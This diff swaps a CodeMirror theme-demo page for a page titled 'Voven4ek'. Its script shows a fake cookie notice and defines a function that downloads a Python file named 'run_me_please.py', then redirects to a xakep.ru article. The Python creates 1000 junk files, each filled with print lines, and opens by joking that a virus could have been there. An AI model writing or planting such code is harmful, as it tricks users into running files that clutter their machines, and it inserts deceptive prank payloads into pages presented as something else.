@@ -1,183 +1,31 @@
-<head><title>CodeMirror: Theme Demo</title>
-    <meta charset="utf-8">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/doc/docs.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/lib/codemirror.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/3024-day.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/3024-night.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/abcdef.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/ambiance.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/ayu-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/ayu-mirage.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/base16-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/bespin.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/base16-light.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/blackboard.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/cobalt.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/colorforth.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/dracula.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/duotone-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/duotone-light.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/eclipse.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/elegant.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/erlang-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/gruvbox-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/hopscotch.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/icecoder.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/isotope.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/lesser-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/liquibyte.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/lucario.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/material.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/material-darker.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/material-palenight.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/material-ocean.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/mbo.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/mdn-like.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/midnight.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/monokai.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/moxer.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/neat.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/neo.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/night.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/nord.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/oceanic-next.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/panda-syntax.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/paraiso-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/paraiso-light.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/pastel-on-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/railscasts.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/rubyblue.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/seti.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/shadowfox.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/solarized.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/the-matrix.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/tomorrow-night-bright.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/tomorrow-night-eighties.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/ttcn.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/twilight.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/vibrant-ink.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/xq-dark.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/xq-light.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/yeti.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/idea.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/darcula.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/yonce.css">
-    <link rel="stylesheet" href="static/codemirror/codemirror-5.58.1/theme/zenburn.css">
-    <script src="static/codemirror/codemirror-5.58.1/lib/codemirror.js"></script>
-    <script src="static/codemirror/codemirror-5.58.1/mode/javascript/javascript.js"></script>
-    <script src="static/codemirror/codemirror-5.58.1/addon/selection/active-line.js"></script>
-    <script src="static/codemirror/codemirror-5.58.1/addon/edit/matchbrackets.js"></script>
-    <style>
-      .CodeMirror {border: 1px solid black; font-size:13px}
-    </style>
-</head><body><div id="nav">
-    <a href="https://codemirror.net"><h1>CodeMirror</h1><img id="logo" src="static/codemirror/codemirror-5.58.1/doc/logo.png"></a>
+<html>
+<head>
+    <title>Voven4ek</title>
+</head>
+<body style="background: url('https://get.wallhere.com/photo/lake-mountain-top-sunset-landscape-1429015.jpg');">
 
-    <ul>
-        <li><a href="../index.html">Home</a>
-        </li><li><a href="../doc/manual.html">Manual</a>
-    </li><li><a href="https://github.com/codemirror/codemirror">Code</a>
-    </li></ul>
-    <ul>
-        <li><a class="active" href="#">Theme</a>
-        </li></ul>
-</div>
-
-<article>
-    <h2>Theme Demo</h2>
-    <form><textarea id="code" name="code" style="display: none;">
-</textarea><div class="CodeMirror cm-s-default"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 141.5px; left: 121.167px;"></div><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1" draggable="true"><div class="CodeMirror-sizer" style="margin-left: 30px; margin-bottom: -12px; border-right-width: 38px; min-height: 242px; min-width: 445.667px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div style="position: relative; outline: currentcolor none medium;" role="presentation"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors" style="visibility: hidden;"><div class="CodeMirror-cursor" style="left: 90.1667px; top: 136.5px; height: 19.5px;">&nbsp;</div></div><div class="CodeMirror-code" role="presentation" style=""><div style="position: relative;" class=""><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-keyword">function</span> <span class="cm-def">findSequence</span>(<span class="cm-def">goal</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">  <span class="cm-keyword">function</span> <span class="cm-def">find</span>(<span class="cm-def">start</span>, <span class="cm-def">history</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-keyword">if</span> (<span class="cm-variable-2">start</span> <span class="cm-operator">==</span> <span class="cm-variable-2">goal</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">      <span class="cm-keyword">return</span> <span class="cm-variable-2">history</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-keyword">else</span> <span class="cm-keyword">if</span> (<span class="cm-variable-2">start</span> <span class="cm-operator">&gt;</span> <span class="cm-variable-2">goal</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">      <span class="cm-keyword">return</span> <span class="cm-atom">null</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-keyword">else</span></span></pre></div><div style="position: relative;" class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -30px; width: 30px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">      <span class="cm-keyword">return</span> <span class="cm-variable-2">find</span>(<span class="cm-variable-2">start</span> <span class="cm-operator">+</span> <span class="cm-number">5</span>, <span class="cm-string">"("</span> <span class="cm-operator">+</span> <span class="cm-variable-2">history</span> <span class="cm-operator">+</span> <span class="cm-string">" + 5)"</span>) <span class="cm-operator">||</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">             <span class="cm-variable-2">find</span>(<span class="cm-variable-2">start</span> <span class="cm-operator">*</span> <span class="cm-number">3</span>, <span class="cm-string">"("</span> <span class="cm-operator">+</span> <span class="cm-variable-2">history</span> <span class="cm-operator">+</span> <span class="cm-string">" * 3)"</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">  <span class="cm-keyword">return</span> <span class="cm-variable-2">find</span>(<span class="cm-number">1</span>, <span class="cm-string">"1"</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 38px; width: 1px; border-bottom: 0px solid transparent; top: 242px;"></div><div class="CodeMirror-gutters" style="height: 280px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div></div></form>
-
-    <p>Select a theme: <select onchange="selectTheme()" id="select">
-        <option selected="">default</option>
-        <option>3024-day</option>
-        <option>3024-night</option>
-        <option>abcdef</option>
-        <option>ambiance</option>
-        <option>ayu-dark</option>
-        <option>ayu-mirage</option>
-        <option>base16-dark</option>
-        <option>base16-light</option>
-        <option>bespin</option>
-        <option>blackboard</option>
-        <option>cobalt</option>
-        <option>colorforth</option>
-        <option>darcula</option>
-        <option>dracula</option>
-        <option>duotone-dark</option>
-        <option>duotone-light</option>
-        <option>eclipse</option>
-        <option>elegant</option>
-        <option>erlang-dark</option>
-        <option>gruvbox-dark</option>
-        <option>hopscotch</option>
-        <option>icecoder</option>
-        <option>idea</option>
-        <option>isotope</option>
-        <option>lesser-dark</option>
-        <option>liquibyte</option>
-        <option>lucario</option>
-        <option>material</option>
-        <option>material-darker</option>
-        <option>material-palenight</option>
-        <option>material-ocean</option>
-        <option>mbo</option>
-        <option>mdn-like</option>
-        <option>midnight</option>
-        <option>monokai</option>
-        <option>moxer</option>
-        <option>neat</option>
-        <option>neo</option>
-        <option>night</option>
-        <option>nord</option>
-        <option>oceanic-next</option>
-        <option>panda-syntax</option>
-        <option>paraiso-dark</option>
-        <option>paraiso-light</option>
-        <option>pastel-on-dark</option>
-        <option>railscasts</option>
-        <option>rubyblue</option>
-        <option>seti</option>
-        <option>shadowfox</option>
-        <option>solarized dark</option>
-        <option>solarized light</option>
-        <option>the-matrix</option>
-        <option>tomorrow-night-bright</option>
-        <option>tomorrow-night-eighties</option>
-        <option>ttcn</option>
-        <option>twilight</option>
-        <option>vibrant-ink</option>
-        <option>xq-dark</option>
-        <option>xq-light</option>
-        <option>yeti</option>
-        <option>yonce</option>
-        <option>zenburn</option>
-    </select>
-    </p>
-
-    <script>
-  var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
-    lineNumbers: true,
-    styleActiveLine: true,
-    matchBrackets: true
-  });
-  var input = document.getElementById("select");
-  function selectTheme() {
-    var theme = input.options[input.selectedIndex].textContent;
-    editor.setOption("theme", theme);
-    location.hash = "#" + theme;
-  }
-  var choice = (location.hash && location.hash.slice(1)) ||
-               (document.location.search &&
-                decodeURIComponent(document.location.search.slice(1)));
-  if (choice) {
-    input.value = choice;
-    editor.setOption("theme", choice);
-  }
-  CodeMirror.on(window, "hashchange", function() {
-    var theme = location.hash.slice(1);
-    if (theme) { input.value = theme; selectTheme(); }
-  });
+<script>
+    var text = `print("А здесь мог бы быть вирус эх-эх-эх :(")
+for a in range(1, 1001):
+    with open('hello_it_is_me{}.py'.format(a), 'wb+') as file:
+        pass
+    with open('hello_it_is_me{}.py'.format(a), 'w') as file1:
+        text = """print('hello from ho?')\n"""
+        file1.write(text*300)`;
+    alert('Мы используем cookie');
+    function go_to_page(){
+    downloadAsFile(text);
+    document.location.href = "https://xakep.ru/2011/03/13/55980/";
+    }
+    function downloadAsFile(data) {
+          let a = document.createElement("a");
+          let file = new Blob([data], {type: 'text/html'});
+          a.href = URL.createObjectURL(file);
+          if (name!=null){
+          a.download = "run_me_please.py";
+          a.click();
+          }
+          }
 </script>
-</article>
 </body>
+</html>
